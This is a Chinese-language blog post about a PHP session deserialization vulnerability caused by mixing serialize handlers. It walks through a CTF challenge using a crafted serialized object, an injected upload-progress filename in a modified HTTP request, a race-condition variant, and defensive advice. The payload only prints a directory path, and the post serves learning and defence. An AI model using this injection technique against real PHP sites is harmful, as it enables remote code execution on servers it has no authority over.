<!DOCTYPE HTML><html><head><meta charset="utf-8"><title>php session反序列化漏洞 | 峰焕亭</title><meta name="author" content="xiaopo"><meta name="description" content="健健康康最重要 平平安安才是福"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><meta property="og:title" content="php session反序列化漏洞"><meta property="og:site_name" content="峰焕亭"><link rel="apple-touch-icon" sizes="180x180" href="/favicon_io/apple-touch-icon.png"><link rel="icon" type="image/png" href="/favicon_io/favicon-32x32.png" sizes="32x32"><link rel="icon" type="image/png" href="/favicon_io/favicon-16x16.png" sizes="16x16"><link rel="manifest" href="/favicon_io/site.webmanifest"><meta name="msapplication-TileColor" content="#009688"><meta name="msapplication-TileImage" content="/mstile-144x144.png"><meta name="theme-color" content="#009688"><link rel="stylesheet" href="/libs/tocify/jquery.tocify.css" media="screen" type="text/css"><link rel="stylesheet" href="//apps.bdimg.com/libs/bootstrap/3.3.4/css/bootstrap.min.css" media="screen" type="text/css"><link rel="stylesheet" href="//apps.bdimg.com/libs/bootstrap-material/0.3.0/css/ripples.min.css" media="screen" type="text/css"><link rel="stylesheet" href="//apps.bdimg.com/libs/bootstrap-material/0.3.0/css/material.min.css" media="screen" type="text/css"><link rel="stylesheet" href="/css/highlight.light.css" media="screen" type="text/css"><link rel="stylesheet" href="/css/style.css" media="screen" type="text/css"><script src="//apps.bdimg.com/libs/jquery/2.0.3/jquery.min.js"></script><script>window.jQuery||document.write('<script src="/libs/jquery-2.0.3.min.js" type="text/javascript"><\/script>')</script><meta name="generator" content="Hexo 4.2.1"></head></html><body><nav class="navbar navbar-default"><div class="container"><div class="navbar-header"><button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar"><span class="sr-only">菜单</span> <span class="icon-bar"></span> <span class="icon-bar"></span> <span class="icon-bar"></span></button> <a class="navbar-brand" href="/">峰焕亭</a></div><div id="navbar" class="collapse navbar-collapse"><ul class="nav navbar-nav navbar-right"><li><a href="/"><i class="fa fa-home"></i>首页</a></li><li><a href="/archives"><i class="fa fa-list"></i>归档</a></li><li><a href="/about" title="简介"><i class="fa fa-info-circle"></i>关于</a></li></ul></div></div></nav><div class="container"><div class="row"><div class="col-md-9"><div class="content"><h2>php session反序列化漏洞</h2><div><span class="post-time">2020-07-10 15:55:09</span></div><div class="article-content"><p>php session在服务端是需要存储的，存储介质一般是file，存储就会涉及到序列化/反序列化，当序列化/反序列化处理器混用的情况就有可能出现问题，特别是在存储时使用php_serialize处理器，读取时使用php处理器，就很有可能会有问题，实际场景并不多，今天作为一种漏洞类型学习一下，大部分都是学习网上的思路，自己实践遇到了一些坑点。</p><a id="more"></a><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="php-session反序列化的定义"><a href="#php-session反序列化的定义" class="headerlink" title="php session反序列化的定义"></a>php session反序列化的定义</h3><p>什么是php session反序列化，当php开启会话(session_start)的时候，php会从对应session文件中读取数据将其反序列化到$_SESSION，同样地，当会话关闭时，php会把$_SESSION里面的数据序列化存入session文件，php内置了多种处理器用于存取$_SESSION数据，常用的有以下三种不同的处理格式：<br>| 处理器 | 对应的存储格式 | 示例（序列化串） | 备注 |<br>| ————————- | ———————————————————— | —————— | —————————————————- |<br>| php | 键名 ＋ 竖线 ＋ 经过 serialize() 函数反序列处理的值 | a|i:2; | |<br>| php_binary | 键名的长度对应的 ASCII 字符 ＋ 键名 ＋ 经过 serialize() 函数反序列处理的值 | ^Aai:2; | ^A为一个字符，<br>通过hexdump -C查看其十六进制为01 |<br>| php_serialize(php&gt;=5.5.4) | 经过 serialize() 函数反序列处理的数组 | a:1:{s:1:”a”;i:2;} | |<br>示例结果为<code>$_SESSION[&#39;a&#39;] = 2</code>的序列化串，可使用如下代码测试得到，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php_serialize'</span>);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">'a'</span>] = <span class="number">2</span>;</span><br><span class="line">session_write_close();</span><br></pre></td></tr></table></figure><p>我使用oneinstack安装php之后显示的默认处理器是php不是php_serialize，应该是oneinstack对其进行了修改</p><h3 id="产生的原理"><a href="#产生的原理" class="headerlink" title="产生的原理"></a>产生的原理</h3><p>漏洞产生的原理就是在用session.serialize_handler = php_serialize存储的字符可以引入|, 再用session.serialize_handler = php格式取出session文件内容时，|会被当成键值对的分隔符，在特定的地方会造成反序列化漏洞，具体可参见漏洞复现部分。</p><h3 id="涉及的php-ini配置项"><a href="#涉及的php-ini配置项" class="headerlink" title="涉及的php.ini配置项"></a>涉及的php.ini配置项<img src="https://i.loli.net/2020/07/10/8aEIF5zQwyqmYsU.png" alt="/data/typora_assets/php session反序列化踩坑/image-20200708210328939.png"></h3><p>默认情况下session.upload_progress.cleanup的值为On，我们目前暂时手动修改为Off，以便保证在脚本开始运行时上传进度相关的session信息依然存在，在该选项为On的情况下可以利用竞态条件来实现session信息的反序列化，关于该配置项的解释，可参见php官方文档。</p><blockquote><p>Note that if you run that code and you print out the content of $_SESSSION[$key] you get an empty array due that session.upload_progress.cleanup is on by default and it cleans the progress information as soon as all POST data has been read.<br>Set it to Off or 0 to see the content of $_SESSION[$key].</p></blockquote><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p><a href="http://web.jarvisoj.com:32784/index.php" target="_blank" rel="noopener">http://web.jarvisoj.com:32784/index.php</a> ，复制该题的源码存入session_unserialize.php，它在开头使用了<code>ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</code>而php.ini中session.serialize_handler配置为php_serialize，故可能存在php session反序列化漏洞，而恰好有类OowoO存在eval危险函数，此危险函数同时又在类OowoO的__destruct()中，于是我们使用如下代码构造序列化串以显示文件所在目录</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz=<span class="string">'print_r(dirname(__FILE__));'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$obj = <span class="keyword">new</span> OowoO();</span><br><span class="line">$a = serialize($obj);</span><br><span class="line"></span><br><span class="line">var_dump($a);</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line"><span class="string">'O:5:"OowoO":1:&#123;s:4:"mdzz";s:27:"print_r(dirname(__FILE__));";&#125;'</span></span><br></pre></td></tr></table></figure><p>在输出结果前面加上|，然后想办法作为$_SESSION的某个键值使用php_serialize处理器序列化到session文件中，然后再从session文件中使用php处理器反序列化出来，那么漏洞就会产生。<br>反序列化的漏洞文件session_unserialize.php已经有了，下一步重点是我们要想办法把序列化串存到$_SESSION中，这时就要用到php.ini的配置项sesssion.upload_progress.enabled=On，默认为开启状态，查看php官方文档<a href="https://www.php.net/manual/en/session.upload-progress.php" target="_blank" rel="noopener">https://www.php.net/manual/en/session.upload-progress.php</a></p><blockquote><p>The upload progress will be available in the $_SESSION superglobal when an upload is in progress, and when POSTing a variable of the same name as the session.upload_progress.name INI setting is set to. When PHP detects such POST requests, it will populate an array in the $_SESSION, where the index is a concatenated value of the session.upload_progress.prefix and session.upload_progress.name INI options. The key is typically retrieved by reading these INI settings, i.e.</p></blockquote><p>也就是说当开启上传进度查看时，如果发送一个POST请求，POST请求中有个参数的名称是session.upload_progress.name的值（一般是PHP_SESSION_UPLOAD_PROGRESS），那么后端会在$_SESSION超全局数组里面记录上传进度用以返回给前端，具体$_SESSION超全局数组里面会存储什么，下面也有介绍，也可以自行写代码测试进行查看，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">Example of the structure of the progress upload array.</span><br><span class="line"></span><br><span class="line">&lt;form action&#x3D;&quot;upload.php&quot; method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line"> &lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;&lt;?php echo ini_get(&quot;session.upload_progress.name&quot;); ?&gt;&quot; value&#x3D;&quot;123&quot; &#x2F;&gt;</span><br><span class="line"> &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file1&quot; &#x2F;&gt;</span><br><span class="line"> &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file2&quot; &#x2F;&gt;</span><br><span class="line"> &lt;input type&#x3D;&quot;submit&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line">The data stored in the session will look like this:</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$_SESSION[&quot;upload_progress_123&quot;] &#x3D; array(</span><br><span class="line"> &quot;start_time&quot; &#x3D;&gt; 1234567890,   &#x2F;&#x2F; The request time</span><br><span class="line"> &quot;content_length&quot; &#x3D;&gt; 57343257, &#x2F;&#x2F; POST content length</span><br><span class="line"> &quot;bytes_processed&quot; &#x3D;&gt; 453489,  &#x2F;&#x2F; Amount of bytes received and processed</span><br><span class="line"> &quot;done&quot; &#x3D;&gt; false,              &#x2F;&#x2F; true when the POST handler has finished, successfully or not</span><br><span class="line"> &quot;files&quot; &#x3D;&gt; array(</span><br><span class="line">  0 &#x3D;&gt; array(</span><br><span class="line">   &quot;field_name&quot; &#x3D;&gt; &quot;file1&quot;,       &#x2F;&#x2F; Name of the &lt;input&#x2F;&gt; field</span><br><span class="line">   &#x2F;&#x2F; The following 3 elements equals those in $_FILES</span><br><span class="line">   &quot;name&quot; &#x3D;&gt; &quot;foo.avi&quot;,</span><br><span class="line">   &quot;tmp_name&quot; &#x3D;&gt; &quot;&#x2F;tmp&#x2F;phpxxxxxx&quot;,</span><br><span class="line">   &quot;error&quot; &#x3D;&gt; 0,</span><br><span class="line">   &quot;done&quot; &#x3D;&gt; true,                &#x2F;&#x2F; True when the POST handler has finished handling this file</span><br><span class="line">   &quot;start_time&quot; &#x3D;&gt; 1234567890,    &#x2F;&#x2F; When this file has started to be processed</span><br><span class="line">   &quot;bytes_processed&quot; &#x3D;&gt; 57343250, &#x2F;&#x2F; Number of bytes received and processed for this file</span><br><span class="line">  ),</span><br><span class="line">  &#x2F;&#x2F; An other file, not finished uploading, in the same request</span><br><span class="line">  1 &#x3D;&gt; array(</span><br><span class="line">   &quot;field_name&quot; &#x3D;&gt; &quot;file2&quot;,</span><br><span class="line">   &quot;name&quot; &#x3D;&gt; &quot;bar.avi&quot;,</span><br><span class="line">   &quot;tmp_name&quot; &#x3D;&gt; NULL,</span><br><span class="line">   &quot;error&quot; &#x3D;&gt; 0,</span><br><span class="line">   &quot;done&quot; &#x3D;&gt; false,</span><br><span class="line">   &quot;start_time&quot; &#x3D;&gt; 1234567899,</span><br><span class="line">   &quot;bytes_processed&quot; &#x3D;&gt; 54554,</span><br><span class="line">  ),</span><br><span class="line"> )</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>值得一提的是这种情况下，$_SESSION超全局数组里面会存储$_FILES超全局数组里面的一些信息，最为关键的是file name和file temp name，我们就借助file name来把序列化串写入到$_SESSION中，构造html请求表单</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>php session unserialize example<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://localhost/vuln/session_unserialize.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> <span class="attr">value</span>=<span class="string">"123"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>随意提交文件上传，burp拦截改包如下，</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/vuln/session_unserialize.php</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: localhost</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64; rv:56.0) Gecko/20100101 Firefox/56.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=---------------------------1314365402189625052536245878</span><br><span class="line"><span class="attribute">Content-Length</span>: 424</span><br><span class="line"><span class="attribute">Referer</span>: http://localhost/vuln/session_unserialize.html</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=9nhpcsuogisgjnmfm5e3gqri43; XDEBUG_SESSION=PHPSTORM</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"></span><br><span class="line">-----------------------------1314365402189625052536245878</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"</span><br><span class="line"></span><br><span class="line"><span class="attribute">123</span></span><br><span class="line"><span class="attribute">-----------------------------1314365402189625052536245878</span></span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="file"; filename="|O:5:\"OowoO\":1:&#123;s:4:\"mdzz\";s:27:\"print_r(dirname(__FILE__));\";&#125;"</span><br><span class="line"><span class="attribute">Content-Type</span>: application/octet-stream</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-----------------------------1314365402189625052536245878--</span><br></pre></td></tr></table></figure><p>因为HTTP包Cookie中带有XDEBUG_SESSION=PHPSTORM，故burp发包也会触发PHPSTORM调试机制，该包我们调试一下，<br><img src="https://i.loli.net/2020/07/10/YEn89uHV1lLcOfx.png" alt="/data/typora_assets/php session反序列化踩坑/image-20200708220406122.png"></p><p>此时session文件内容如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> xiaopo @ fht <span class="keyword">in</span> ~/grayguest.github.io on git:writing x [22:02:34] </span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo cat /tmp/sess_9nhpcsuogisgjnmfm5e3gqri43</span></span><br><span class="line">a:2:&#123;s:1:"a";i:2;s:19:"upload_progress_123";a:5:&#123;s:10:"start_time";i:1594216960;s:14:"content_length";i:424;s:15:"bytes_processed";i:424;s:4:"done";b:1;s:5:"files";a:1:&#123;i:0;a:7:&#123;s:10:"field_name";s:4:"file";s:4:"name";s:63:"|O:5:"OowoO":1:&#123;s:4:"mdzz";s:27:"print_r(dirname(__FILE__));";&#125;";s:8:"tmp_name";s:14:"/tmp/php5ueiZ3";s:5:"error";i:0;s:4:"done";b:1;s:10:"start_time";i:1594216960;s:15:"bytes_processed";i:424;&#125;&#125;&#125;&#125;%</span><br></pre></td></tr></table></figure><p>此时还未更改反序列化处理器，所以$_SESSION数组比较正常，有的人可能会问，session_start()还没开始，怎么数据已经反序列化到$_SESSION数组中了呢，这可能是因为session.auto_start = on，具体session.auto_start的解释可参见<a href="https://github.com/80vul/phpcodz/blob/master/research/pch-013.md，" target="_blank" rel="noopener">https://github.com/80vul/phpcodz/blob/master/research/pch-013.md，</a></p><blockquote><p>配置选项 session.auto_start＝On，会自动注册 Session 会话，因为该过程是发生在脚本代码执行前，所以在脚本中设定的包括序列化处理器在内的 session 相关配选项的设置是不起作用的，因此一些需要在脚本中设置序列化处理器配置的程序会在 session.auto_start＝On 时，销毁自动生成的 Session 会话，然后设置需要的序列化处理器，再调用 session_start() 函数注册会话</p></blockquote><p>但是我的php.ini中session.auto_start配置为off，那又会是其他什么原因呢，猜测可能和上传过程有关系，先不管它，往下单步，</p><p><img src="https://i.loli.net/2020/07/10/uqMmdC5hAKX9ELw.png" alt="/data/typora_assets/php session反序列化踩坑/image-20200708220516329.png"><br>此时已经更改反序列化处理器为php，故会使用php处理器进行反序列化后存入$_SESSION，于是危险类被触发，返回当前路径，待执行完毕，session文件内容如下，</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> xiaopo @ fht <span class="keyword">in</span> ~/grayguest.github.io on git:writing x [22:02:53] </span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo cat /tmp/sess_9nhpcsuogisgjnmfm5e3gqri43</span></span><br><span class="line">a:1:&#123;s:19:"upload_progress_123";a:5:&#123;s:10:"start_time";i:1594217096;s:14:"content_length";i:424;s:15:"bytes_processed";i:424;s:4:"done";b:1;s:5:"files";a:1:&#123;i:0;a:7:&#123;s:10:"field_name";s:4:"file";s:4:"name";s:63:"|O:5:"OowoO":1:&#123;s:4:"mdzz";s:27:"print_r(dirname(__FILE__));";&#125;%</span><br></pre></td></tr></table></figure><h2 id="利用竞态条件来实现session信息的反序列化"><a href="#利用竞态条件来实现session信息的反序列化" class="headerlink" title="利用竞态条件来实现session信息的反序列化"></a>利用竞态条件来实现session信息的反序列化</h2><p><a href="https://xz.aliyun.com/t/6640#toc-10" target="_blank" rel="noopener">https://xz.aliyun.com/t/6640#toc-10</a> ，panda师傅的这篇文章最后的实例，关于“由于请求后，session会立刻被清空覆盖，因此需要不断发送请求，这里可以写脚本，也可以直接利用burp ，我偷个懒直接利用 burp ：”我理解session之所以会被清空是因为session.upload_progress.cleanup为On，按道理它在php文件运行前就已经被清空了，后来得知panda师傅是利用竞态条件来实现的，然后我尝试burp发包1000次也没能写入文件，刚开始不知道可能是什么原因，<br><img src="https://i.loli.net/2020/07/10/c7MG9LpOYX3kmfz.png" alt="/data/typora_assets/php session反序列化踩坑/image-20200710104920949.png"><br>后来把burp intruder线程调到50，成功反序列化，另外注意web权限要有写本地文件权限。<br><img src="https://i.loli.net/2020/07/10/qi6WfLx28RQv3Ce.png" alt="/data/typora_assets/php session反序列化踩坑/image-20200710151950385.png"></p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><ul><li>统一使用相同的处理器做序列化/反序列化，比如php_serialize。</li><li>当使用php处理器做反序列化时，必须保证不和php_serialize处理器混用。</li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://xz.aliyun.com/t/3674" target="_blank" rel="noopener">https://xz.aliyun.com/t/3674</a></li><li><a href="https://xz.aliyun.com/t/6640" target="_blank" rel="noopener">https://xz.aliyun.com/t/6640</a></li><li><a href="https://github.com/80vul/phpcodz/blob/master/research/pch-013.md" target="_blank" rel="noopener">https://github.com/80vul/phpcodz/blob/master/research/pch-013.md</a></li><li><a href="https://mp.weixin.qq.com/s/n5ofmXbDxWgOCg4oNgPtsw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/n5ofmXbDxWgOCg4oNgPtsw</a></li><li><a href="https://www.php.net/manual/en/session.upload-progress.php" target="_blank" rel="noopener">https://www.php.net/manual/en/session.upload-progress.php</a></li></ul></div><style type="text/css">.page-copyright{margin:2em 0 0;padding:.5em 1em;border-left:3px solid #ff1700;background-color:#f9f9f9;list-style:none}.page-copyright li{line-height:30px}</style><div><ul class="page-copyright"><li class="page-copyright-author"><strong>作者: </strong>xiaopo</li><li class="page-copyright-link"><strong>文章链接: </strong><a href="/2020/07/10/php session反序列化漏洞/" target="_blank" title="php session反序列化漏洞">https://xiaopo.org/2020/07/10/php session反序列化漏洞/</a></li><li class="page-copyright-license"><strong>版权声明: </strong>本网站所有文章除特别声明外，均采用<a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a> 许可协议，非商业转载请注明出处（原文作者，原文链接），商业转载请联系作者获得授权。</li></ul><div></div></div></div><div class="comment-section"></div></div><div class="col-md-3"><div id="toc"></div></div></div><footer><p>由 <a href="https://hexo.io" target="_blank" rel="noopener">hexo</a> 强力驱动 | 搭载 <a href="https://github.com/wayou/hexo-theme-material" target="_blank" rel="noopener">material</a> 主题</p><p>&copy; 2020 <a href="https://xiaopo.org">xiaopo</a></p><a id="gotop" href="#" title="back to top"><i class="mdi-hardware-keyboard-arrow-up"></i></a></footer></div><script src="//apps.bdimg.com/libs/bootstrap/3.3.4/js/bootstrap.min.js"></script><script>"function"==typeof $().modal||document.write('<script src="/libs/bs/js/bootstrap.min.js" type="text/javascript"><\/script>')</script><script src="//apps.bdimg.com/libs/bootstrap-material/0.3.0/js/ripples.min.js"></script><script src="//apps.bdimg.com/libs/bootstrap-material/0.3.0/js/material.min.js"></script><script src="//apps.bdimg.com/libs/jqueryui/1.10.4/jquery-ui.min.js"></script><script src="/libs/tocify/jquery.tocify.custom.js"></script><script src="/js/main.js"></script></body>